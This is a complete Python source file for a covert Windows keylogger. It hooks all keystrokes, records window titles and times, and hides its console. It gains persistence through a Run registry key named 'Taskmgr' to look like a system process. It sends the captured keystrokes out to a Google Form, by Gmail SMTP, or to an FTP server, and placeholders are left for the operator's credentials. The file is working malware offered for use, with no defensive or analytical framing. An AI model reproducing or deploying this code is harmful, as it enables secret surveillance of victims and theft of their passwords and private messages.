#!/usr/bin/env python
# -*- coding: utf-8 -*-
from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
import os                  # for handling paths and removing files (FTP mode)
import sys                 # for getting sys.argv
import win32event, \
       win32api, winerror  # for disallowing multiple instances
import win32console        # for getting the console window
import win32gui            # for getting window titles and hiding the console window
import ctypes              # for getting window titles, current keyboard layout and capslock state
import threading, smtplib  # for emailing logs
import ftplib              # for sending logs via FTP
import urllib              # for accessing Google Forms
import datetime            # for getting the current time and using timedelta
import base64
import hashlib             # for hashing the names of files

# CONSTANTS
# this number of characters must be typed for the logger to write the line_buffer:
CHAR_LIMIT = 20           # a safe margin
MINUTES_TO_LOG_TIME = 5   # this number of minutes must pass for the current time to be logged.

# - GLOBAL SCOPE VARIABLES start -
# general check
if len(sys.argv) == 1:
    sys.argv = [sys.argv[0], 'local']
mode = sys.argv[1]

line_buffer, window_name = '', ''
time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
count, backspace_buffer_len = 0, 0

# Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
lcid_dict = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
             '0x401': 'Arabic - Saudi Arabia', '0x1401': 'Arabic - Algeria', '0x3c01': 'Arabic - Bahrain',
             '0x0c01': 'Arabic - Egypt', '0x801': 'Arabic - Iraq', '0x2c01': 'Arabic - Jordan',
             '0x3401': 'Arabic - Kuwait', '0x3001': 'Arabic - Lebanon', '0x1001': 'Arabic - Libya',
             '0x1801': 'Arabic - Morocco', '0x2001': 'Arabic - Oman', '0x4001': 'Arabic - Qatar',
             '0x2801': 'Arabic - Syria', '0x1c01': 'Arabic - Tunisia', '0x3801': 'Arabic - U.A.E.',
             '0x2401': 'Arabic - Yemen', '0x042b': 'Armenian - Armenia', '0x044d': 'Assamese',
             '0x082c': 'Azeri (Cyrillic)', '0x042c': 'Azeri (Latin)', '0x042d': 'Basque', '0x423': 'Belarusian',
             '0x445': 'Bengali (India)', '0x845': 'Bengali (Bangladesh)', '0x141A': 'Bosnian (Bosnia/Herzegovina)',
             '0x402': 'Bulgarian', '0x455': 'Burmese', '0x403': 'Catalan', '0x045c': 'Cherokee - United States',
             '0x804': "Chinese - People's Republic of China", '0x1004': 'Chinese - Singapore',
             '0x404': 'Chinese - Taiwan', '0x0c04': 'Chinese - Hong Kong SAR', '0x1404': 'Chinese - Macao SAR',
             '0x041a': 'Croatian', '0x101a': 'Croatian (Bosnia/Herzegovina)', '0x405': 'Czech', '0x406': 'Danish',
             '0x465': 'Divehi', '0x413': 'Dutch - Netherlands', '0x813': 'Dutch - Belgium', '0x466': 'Edo',
             '0x409': 'English - United States', '0x809': 'English - United Kingdom', '0x0c09': 'English - Australia',
             '0x2809': 'English - Belize', '0x1009': 'English - Canada', '0x2409': 'English - Caribbean',
             '0x3c09': 'English - Hong Kong SAR', '0x4009': 'English - India', '0x3809': 'English - Indonesia',
             '0x1809': 'English - Ireland', '0x2009': 'English - Jamaica', '0x4409': 'English - Malaysia',
             '0x1409': 'English - New Zealand', '0x3409': 'English - Philippines', '0x4809': 'English - Singapore',
             '0x1c09': 'English - South Africa', '0x2c09': 'English - Trinidad', '0x3009': 'English - Zimbabwe',
             '0x425': 'Estonian', '0x438': 'Faroese', '0x429': 'Farsi', '0x464': 'Filipino', '0x040b': 'Finnish',
             '0x040c': 'French - France', '0x080c': 'French - Belgium', '0x2c0c': 'French - Cameroon',
             '0x0c0c': 'French - Canada', '0x240c': 'French - Democratic Rep. of Congo', '0x300c':
                 "French - Cote d'Ivoire", '0x3c0c': 'French - Haiti', '0x140c': 'French - Luxembourg',
             '0x340c': 'French - Mali', '0x180c': 'French - Monaco', '0x380c': 'French - Morocco',
             '0xe40c': 'French - North Africa', '0x200c': 'French - Reunion', '0x280c': 'French - Senegal',
             '0x100c': 'French - Switzerland', '0x1c0c': 'French - West Indies', '0x462': 'Frisian - Netherlands',
             '0x467': 'Fulfulde - Nigeria', '0x042f': 'FYRO Macedonian', '0x083c': 'Gaelic (Ireland)',
             '0x043c': 'Gaelic (Scotland)', '0x456': 'Galician', '0x437': 'Georgian', '0x407': 'German - Germany',
             '0x0c07': 'German - Austria', '0x1407': 'German - Liechtenstein', '0x1007': 'German - Luxembourg',
             '0x807': 'German - Switzerland', '0x408': 'Greek', '0x474': 'Guarani - Paraguay', '0x447': 'Gujarati',
             '0x468': 'Hausa - Nigeria', '0x475': 'Hawaiian - United States', '0x040d': 'Hebrew', '0x439': 'Hindi',
             '0x040e': 'Hungarian', '0x469': 'Ibibio - Nigeria', '0x040f': 'Icelandic', '0x470': 'Igbo - Nigeria',
             '0x421': 'Indonesian', '0x045d': 'Inuktitut', '0x410': 'Italian - Italy',
             '0x810': 'Italian - Switzerland', '0x411': 'Japanese', '0x044b': 'Kannada', '0x471': 'Kanuri - Nigeria',
             '0x860': 'Kashmiri', '0x460': 'Kashmiri (Arabic)', '0x043f': 'Kazakh', '0x453': 'Khmer',
             '0x457': 'Konkani', '0x412': 'Korean', '0x440': 'Kyrgyz (Cyrillic)', '0x454': 'Lao', '0x476': 'Latin',
             '0x426': 'Latvian', '0x427': 'Lithuanian', '0x043e': 'Malay - Malaysia',
             '0x083e': 'Malay - Brunei Darussalam', '0x044c': 'Malayalam', '0x043a': 'Maltese', '0x458': 'Manipuri',
             '0x481': 'Maori - New Zealand', '0x044e': 'Marathi', '0x450': 'Mongolian (Cyrillic)',
             '0x850': 'Mongolian (Mongolian)', '0x461': 'Nepali', '0x861': 'Nepali - India',
             '0x414': 'Norwegian (Bokmål)', '0x814': 'Norwegian (Nynorsk)', '0x448': 'Oriya', '0x472': 'Oromo',
             '0x479': 'Papiamentu', '0x463': 'Pashto', '0x415': 'Polish', '0x416': 'Portuguese - Brazil',
             '0x816': 'Portuguese - Portugal', '0x446': 'Punjabi', '0x846': 'Punjabi (Pakistan)',
             '0x046B': 'Quecha - Bolivia', '0x086B': 'Quecha - Ecuador', '0x0C6B': 'Quecha - Peru',
             '0x417': 'Rhaeto-Romanic', '0x418': 'Romanian', '0x818': 'Romanian - Moldava', '0x419': 'Russian',
             '0x819': 'Russian - Moldava', '0x043b': 'Sami (Lappish)', '0x044f': 'Sanskrit', '0x046c': 'Sepedi',
             '0x0c1a': 'Serbian (Cyrillic)', '0x081a': 'Serbian (Latin)', '0x459': 'Sindhi - India',
             '0x859': 'Sindhi - Pakistan', '0x045b': 'Sinhalese - Sri Lanka', '0x041b': 'Slovak',
             '0x424': 'Slovenian', '0x477': 'Somali', '0x042e': 'Sorbian', '0x0c0a': 'Spanish - Spain (Modern Sort)',
             '0x040a': 'Spanish - Spain (Traditional Sort)', '0x2c0a': 'Spanish - Argentina',
             '0x400a': 'Spanish - Bolivia', '0x340a': 'Spanish - Chile', '0x240a': 'Spanish - Colombia',
             '0x140a': 'Spanish - Costa Rica', '0x1c0a': 'Spanish - Dominican Republic',
             '0x300a': 'Spanish - Ecuador', '0x440a': 'Spanish - El Salvador', '0x100a': 'Spanish - Guatemala',
             '0x480a': 'Spanish - Honduras', '0xe40a': 'Spanish - Latin America', '0x080a': 'Spanish - Mexico',
             '0x4c0a': 'Spanish - Nicaragua', '0x180a': 'Spanish - Panama', '0x3c0a': 'Spanish - Paraguay',
             '0x280a': 'Spanish - Peru', '0x500a': 'Spanish - Puerto Rico', '0x540a': 'Spanish - United States',
             '0x380a': 'Spanish - Uruguay', '0x200a': 'Spanish - Venezuela', '0x430': 'Sutu', '0x441': 'Swahili',
             '0x041d': 'Swedish', '0x081d': 'Swedish - Finland', '0x045a': 'Syriac', '0x428': 'Tajik',
             '0x045f': 'Tamazight (Arabic)', '0x085f': 'Tamazight (Latin)', '0x449': 'Tamil', '0x444': 'Tatar',
             '0x044a': 'Telugu', '0x041e': 'Thai', '0x851': 'Tibetan - Bhutan',
             '0x451': "Tibetan - People's Republic of China", '0x873': 'Tigrigna - Eritrea',
             '0x473': 'Tigrigna - Ethiopia', '0x431': 'Tsonga', '0x432': 'Tswana', '0x041f': 'Turkish',
             '0x442': 'Turkmen', '0x480': 'Uighur - China', '0x422': 'Ukrainian', '0x420': 'Urdu',
             '0x820': 'Urdu - India', '0x843': 'Uzbek (Cyrillic)', '0x443': 'Uzbek (Latin)', '0x433': 'Venda',
             '0x042a': 'Vietnamese', '0x452': 'Welsh', '0x434': 'Xhosa', '0x478': 'Yi', '0x043d': 'Yiddish',
             '0x046a': 'Yoruba', '0x435': 'Zulu', '0x04ff': 'HID (Human Interface Device)'}

latin_into_cyrillic = (u"`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
                       u"qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
                       u"~`{[}]:;\"'|<,>.?/@#$^&",
                       u"ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
                       u"йцукенгшщзхъфывапролджэячсмитьбю." +
                       u"ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?")   # LATIN - CYRILLIC keyboard mapping
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])   # CYRILLIC - LATIN keyboard mapping

latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])

cyrillic_layouts = ['Russian', 'Russian - Moldava', 'Azeri (Cyrillic)', 'Belarusian', 'Kazakh',
                    'Kyrgyz (Cyrillic)', 'Mongolian (Cyrillic)', 'Tajik', 'Tatar', 'Serbian (Cyrillic)',
                    'Ukrainian', 'Uzbek (Cyrillic)']

full_path = os.path.dirname(os.path.realpath(sys.argv[0]))

# Determine the initial keyboard layout - to fix the keyboard module bug.


def detect_key_layout():
    global lcid_dict
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    # made up of 0xAAABBBB, AAA = HKL (handle object) & BBBB = language ID
    # Language ID -> low 10 bits, Sub-language ID -> high 6 bits
    # Extract language ID from KLID
    lid = klid & (2 ** 16 - 1)
    # Convert language ID from decimal to hexadecimal
    lid_hex = hex(lid)
    try:
        language = lcid_dict[str(lid_hex)]
    except KeyError:
        language = lcid_dict['0x409']  # English - United States
    return language


initial_language = detect_key_layout()

# - GLOBAL SCOPE VARIABLES end -

# Disallowing multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple instance not allowed")
    exit(0)


def get_capslock_state():
    # using the answer here https://stackoverflow.com/a/21160382
    import ctypes
    hll_dll = ctypes.WinDLL("User32.dll")
    vk = 0x14
    return True if hll_dll.GetKeyState(vk) == 1 else False


shift_on = False   # an assumption, GetKeyState doesn't work
capslock_on = get_capslock_state()


def update_upper_case():
    global capslock_on, shift_on
    if (capslock_on and not shift_on) or (not capslock_on and shift_on):
        res = True
    else:
        res = False
    return res


upper_case = update_upper_case()


def log_local():
    # Local mode
    global full_path, line_buffer, backspace_buffer_len, window_name, time_logged
    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
    # md5 only for masking dates - it's easily crackable:
    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
    try:
        with open(os.path.join(full_path, todays_date_hashed + ".txt"), "a") as fp:
            fp.write(line_buffer)
    except:
        # if there's a problem with a file size: rename the old one, and continue as normal
        counter = 0
        while os.path.exists(os.path.join(full_path, todays_date_hashed + "_" + str(counter) + ".txt")):
            counter += 1
        try:
            os.rename(os.path.join(full_path, todays_date_hashed + ".txt"),
                      os.path.join(full_path, todays_date_hashed + "_" + str(counter) + ".txt"))
            window_name = ''
            time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
        except Exception as e:
            print(e)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_remote():
    # Remote mode - Google Form logs post
    global line_buffer, backspace_buffer_len
    url = "https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Specify Google Form URL here
    klog = {'entry.xxxxxxxxxxx': line_buffer}  # Specify the Field Name here
    try:
        dataenc = urllib.parse.urlencode(klog)
        req = urllib.Request(url, dataenc)
        response = urllib.request.urlopen(req)
        line_buffer, backspace_buffer_len = '', 0
    except Exception as e:
        print(e)
    return True


class TimerClass(threading.Thread):
    # Email mode
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()

    def run(self):
        while not self.event.is_set():
            global line_buffer, backspace_buffer_len
            ts = datetime.datetime.now()
            SERVER = "smtp.gmail.com"  # Specify Server Here
            PORT = 587  # Specify Port Here
            USER = "your_email@gmail.com"  # Specify Username Here
            PASS = "password_here"  # Specify Password Here
            FROM = USER  # From address is taken from username
            TO = ["to_address@gmail.com"]  # Specify to address.Use comma if more than one to address is needed.
            SUBJECT = "Keylogger data: " + str(ts)
            MESSAGE = line_buffer
            message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
            try:
                server = smtplib.SMTP()
                server.connect(SERVER, PORT)
                server.starttls()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message)
                line_buffer, backspace_buffer_len = '', 0
                server.quit()
            except Exception as e:
                print(e)
            self.event.wait(120)


def log_ftp():
    # FTP mode - Upload logs to FTP account
    global line_buffer, count, backspace_buffer_len
    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
    # md5 only for masking dates - it's easily crackable:
    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
    count += 1
    FILENAME = todays_date_hashed + "-" + str(count) + ".txt"
    try:
        with open(FILENAME, "a") as fp:
            fp.write(line_buffer)
    except Exception as e:
        print(e)
    line_buffer, backspace_buffer_len = '', 0
    try:
        SERVER = "ftp.xxxxxx.com"   # Specify your FTP Server address
        USERNAME = "ftp_username"   # Specify your FTP Username
        PASSWORD = "ftp_password"   # Specify your FTP Password
        SSL = 1                     # Set 1 for SSL and 0 for normal connection
        OUTPUT_DIR = "/"            # Specify output directory here
        if SSL == 0:
            ft = ftplib.FTP(SERVER, USERNAME, PASSWORD)
        else:
            ft = ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)
        ft.cwd(OUTPUT_DIR)
        with open(FILENAME, 'rb') as fp:
            cmd = 'STOR' + ' ' + FILENAME
            ft.storbinary(cmd, fp)
            ft.quit()
        os.remove(FILENAME)
    except Exception as e:
        print(e)
    return True


def log_debug():
    # Debug mode
    global line_buffer, backspace_buffer_len
    print(line_buffer)
    line_buffer, backspace_buffer_len = '', 0
    return True


def log_it():
    global mode, line_buffer
    # line_buffer = '\n' + line_buffer + '\n'
    if mode == "local":
        log_local()
    elif mode == "remote":
        log_remote()
    elif mode == "email":
        email = TimerClass()
        email.start()
    elif mode == "ftp":
        log_ftp()
    elif mode == 'debug':
        log_debug()
    return True


current_file_path = os.path.realpath(sys.argv[0])


# Add to startup for persistence
def add_to_startup():
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER,
                         key_val, 0, KEY_ALL_ACCESS)
    sys_args = ' '.join([mode])
    reg_value_prefix, reg_value_postfix = '', ''
    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + sys_args + reg_value_postfix
    try:
        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, reg_value)
    except: pass


def hide():
    # Hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


def key_callback(event):
    global line_buffer, window_name, time_logged, upper_case, capslock_on, shift_on, backspace_buffer_len

    if event.event_type == 'up':
        if event.name in ['shift', 'right shift']:  # SHIFT UP
            shift_on = False
            upper_case = update_upper_case()
        return True

    window_buffer, time_buffer = '', ''

    # 1. Detect the active window change - if so, LOG THE WINDOW NAME
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    event_window_name = win32gui.GetWindowText(curr_window)
    if window_name != event_window_name:
        window_buffer = '\n[WindowName: ' + event_window_name + ']: '                 # update the line_buffer
        window_name = event_window_name                                               # set the new value

    # 2. if MINUTES_TO_LOG_TIME minutes has passed - LOG THE TIME
    now = datetime.datetime.now()
    if now - time_logged > datetime.timedelta(minutes=MINUTES_TO_LOG_TIME):
        time_buffer = '\n[Time: ' + ('%02d:%02d' % (now.hour, now.minute)) + ']: '  # update the line_buffer
        time_logged = now                                                           # set the new value

    if time_buffer != "" or window_buffer != "":
        if line_buffer != "":
            log_it()                                    # log anything from old window / times
        line_buffer = time_buffer + window_buffer       # value to begin with
        """ backspace_buffer_len = the number of symbols of line_buffer up until the last technical tag (including it) 
         - window name, time or key tags (<BACKSPACE>, etc.).
        len(line_buffer) - backspace_buffer_len = the number of symbols that we can safely backspace.
        we increment backspace_buffer_len variable only when we append technical stuff
        (time_buffer or window_buffer or <KEYS>): """
        backspace_buffer_len = len(line_buffer)

    key_pressed = ''

    # 3. DETERMINE THE KEY_PRESSED GIVEN THE EVENT
    if event.name in ['left', 'right']:  # arrow keys  # 'home', 'end', 'up', 'down'
        key_pressed_list = list()
        if keyboard.is_pressed('ctrl') or keyboard.is_pressed('right ctrl'):
            key_pressed_list.append('ctrl')
        if keyboard.is_pressed('shift') or keyboard.is_pressed('right shift'):
            key_pressed_list.append('shift')
        key_pressed = '<' + '+'.join(key_pressed_list) + ('+' if len(key_pressed_list) > 0 else '') + event.name + '>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
    elif event.name == 'space':
        key_pressed = ' '
    elif event.name in ['enter', 'tab']:
        key_pressed = '<TAB>' if event.name == 'tab' else '<ENTER>'
        line_buffer += key_pressed
        backspace_buffer_len = len(line_buffer)
        log_it()    # pass event to other handlers
        return True
    elif event.name == 'backspace':
        if len(line_buffer) - backspace_buffer_len > 0:
            line_buffer = line_buffer[:-1]               # remove the last character
        else:
            line_buffer += '<BACKSPACE>'
            backspace_buffer_len = len(line_buffer)
    elif event.name == 'caps lock':                      # CAPS LOCK
        upper_case = not upper_case
        capslock_on = not capslock_on
    elif event.name in ['shift', 'right shift']:         # SHIFT DOWN
        shift_on = True
        upper_case = update_upper_case()
    else:
        key_pressed = event.name
        if len(key_pressed) == 1:
            # if some normal character
            # 3.1. DETERMINE THE SELECTED LANGUAGE AND TRANSLATE THE KEYS IF NEEDED
            # There is a keyboard module bug: when we start a program in one layout and then switch to another,
            # the layout of hooked input DOES NOT change. So we need a workaround.
            language = detect_key_layout()
            global latin_into_cyrillic_trantab, cyrillic_layouts
            if 'English' in language and 'English' not in initial_language:
                # cyrillic -> latin reverse translation is required
                if ord(key_pressed) in cyrillic_into_latin_trantab:
                    key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])
            elif language in cyrillic_layouts and initial_language not in cyrillic_layouts:
                # latin -> cyrillic translation is required
                if ord(key_pressed) in latin_into_cyrillic_trantab:
                    key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])

            # apply upper or lower case
            key_pressed = key_pressed.upper() if upper_case else key_pressed.lower()
        else:
            # unknown character (eg arrow key, shift, ctrl, alt)
            return True  # pass event to other handlers

    # 4. APPEND THE PRESSED KEY TO THE LINE_BUFFER
    line_buffer += key_pressed

    # 5. DECIDE ON WHETHER TO LOG CURRENT line_buffer OR NOT:
    if len(line_buffer) >= CHAR_LIMIT:
        log_it()
    return True  # pass event to other handlers


def main():
    # Disallowing multiple instances
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy_main')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        print("Multiple instances are not allowed")
        exit(0)
    hide()
    add_to_startup()
    keyboard.hook(key_callback)
    keyboard.wait()
    return


if __name__ == '__main__':
    main()
